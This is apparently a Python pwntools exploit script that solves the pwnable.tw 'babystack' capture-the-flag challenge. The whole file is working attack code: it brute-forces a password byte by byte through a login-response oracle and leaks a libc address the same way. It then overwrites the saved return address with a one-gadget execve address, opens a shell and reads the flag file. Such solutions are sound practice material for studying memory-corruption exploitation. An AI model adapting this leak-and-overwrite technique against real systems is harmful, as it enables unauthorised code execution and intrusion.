import pwn

pwn.context.log_level = 'debug'
host = 'chall.pwnable.tw'
port = 10205
binary = './babystack_patched'

# Choose mode: True for local, False for remote
mode = False  # Change to False as needed

if mode:
    conn = pwn.process(binary)
    
else:
    conn = pwn.remote(host, port)

def dump_mem(template, num_byte):
    result = b''
    temp_byte = template
    while len(result) < num_byte:
        is_found = False
        for i in range(0x1, 0xff):
            print("try: ", hex(i))
            conn.sendlineafter(b'>> ', b'1')
            conn.sendlineafter(b'Your passowrd :', temp_byte + bytes([i]))
            response = conn.recvuntil(b'!')
            if b'Login Success' in response:
                temp_byte += bytes([i])
                result += bytes([i])
                is_found = True
                print(f'[+] Found: {result.hex()}')
                conn.sendlineafter(b'>> ', b'1')
                break
        if not is_found:
            print(f'[+] Failed to find byte {len(result)}')
            break
    return result

# leak the password
password = dump_mem(b'', 0x10)
if len(password) < 0x10:
    print('[+] password dump failed, not enough bytes retrieved.')
    exit(1)
print(f'[+] Password leak: {password.hex()}')

#spray stack to fill null bytes
conn.sendlineafter(b'>> ', b'1')
conn.sendafter(b'Your passowrd :', b'\x00' + 63*b'\xfa' + password)# + b'\xfa'*32)

conn.sendlineafter(b'>> ', b'3')
conn.sendafter(b'Copy :', b'a'*63)

#leak libc
conn.sendlineafter(b'>> ', b'1')
leaked_addr = dump_mem(password, 8)
leaked_addr = int.from_bytes(leaked_addr, 'little') - 0x3c0a31
print(f'[+] Leaked libc address: {hex(leaked_addr)}')
leaked_addr += 0xf0567 # from one-gadge tool
print(f'[+] execve address: {hex(leaked_addr)}')
leaked_addr = leaked_addr.to_bytes(8, 'little')

# overwrite rip
conn.sendlineafter(b'>> ', b'1')
conn.sendafter(b'Your passowrd :', b'\x00' + 63*b'\xfa' + password + 8*3*b'\xfa' + leaked_addr)# + b'\xfa'*32)
#pwn.gdb.attach(conn, gdbscript='brva 0x1030\nc')
conn.sendlineafter(b'>> ', b'3')
conn.sendafter(b'Copy :', b'a'*63)
conn.sendlineafter(b'>> ', b'2')
conn.sendline(b"cat /home/babystack/flag")
conn.interactive()
